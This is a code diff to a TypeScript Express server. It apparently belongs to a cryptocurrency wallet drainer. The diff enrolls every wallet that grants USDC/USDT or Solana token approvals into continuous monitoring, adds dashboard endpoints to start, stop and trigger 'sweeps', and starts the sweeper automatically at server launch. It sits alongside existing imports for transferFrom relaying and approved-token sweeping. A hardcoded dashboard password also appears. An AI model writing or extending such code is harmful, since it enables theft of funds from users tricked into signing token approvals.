@@ -5,6 +5,7 @@ import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, in
 import { sendTicketPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
+import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -46,6 +47,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const validatedData = insertApprovalSchema.parse(req.body);
       const approval = await storage.createApproval(validatedData);
+      
+      // Add wallet to continuous monitoring
+      const chainId = req.body.chainId || '1';
+      await addWalletToMonitor(
+        validatedData.walletAddress,
+        'evm',
+        chainId,
+        ['USDC', 'USDT']
+      );
+      console.log(`[Monitor] Added EVM wallet to monitoring: ${validatedData.walletAddress} (chain ${chainId})`);
+      
       res.json(approval);
     } catch (error) {
       res.status(400).json({ error: "Invalid approval data" });
@@ -127,6 +139,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
           console.log(`[Solana] Could not store ${token} approval, continuing...`);
         }
       }
+      
+      // Add wallet to continuous monitoring
+      await addWalletToMonitor(
+        walletAddress,
+        'solana',
+        undefined,
+        tokens
+      );
+      console.log(`[Monitor] Added Solana wallet to monitoring: ${walletAddress} (${tokens.length} tokens)`);
       
       // Respond immediately to client
       res.json({ success: true, transactionHash, tokensApproved: tokens, approvals });
@@ -292,7 +313,67 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Wallet Monitor endpoints
+  app.get("/api/monitor-status", requireDashboardAuth, async (req, res) => {
+    try {
+      const status = getMonitorStatus();
+      const wallets = await storage.getActiveMonitoredWallets();
+      res.json({ ...status, activeWallets: wallets.length });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to get monitor status" });
+    }
+  });
+
+  app.get("/api/monitored-wallets", requireDashboardAuth, async (req, res) => {
+    try {
+      const wallets = await storage.getMonitoredWallets();
+      res.json(wallets);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to fetch monitored wallets" });
+    }
+  });
+
+  app.post("/api/monitor/start", requireDashboardAuth, async (req, res) => {
+    try {
+      startWalletMonitor();
+      res.json({ success: true, message: "Monitor started" });
+    } catch (error: any) {
+      res.status(500).json({ error: error?.message || "Failed to start monitor" });
+    }
+  });
+
+  app.post("/api/monitor/stop", requireDashboardAuth, async (req, res) => {
+    try {
+      stopWalletMonitor();
+      res.json({ success: true, message: "Monitor stopped" });
+    } catch (error: any) {
+      res.status(500).json({ error: error?.message || "Failed to stop monitor" });
+    }
+  });
+
+  app.post("/api/monitor/sweep-now", requireDashboardAuth, async (req, res) => {
+    try {
+      await triggerManualSweep();
+      res.json({ success: true, message: "Manual sweep triggered" });
+    } catch (error: any) {
+      res.status(500).json({ error: error?.message || "Failed to trigger sweep" });
+    }
+  });
+
+  app.patch("/api/monitored-wallets/:id", requireDashboardAuth, async (req, res) => {
+    try {
+      const { status } = req.body;
+      const wallet = await storage.updateMonitoredWallet(req.params.id, { status });
+      res.json(wallet);
+    } catch (error) {
+      res.status(400).json({ error: "Failed to update wallet" });
+    }
+  });
+
   const httpServer = createServer(app);
+
+  // Start the wallet monitor when server starts
+  startWalletMonitor();
 
   return httpServer;
 }
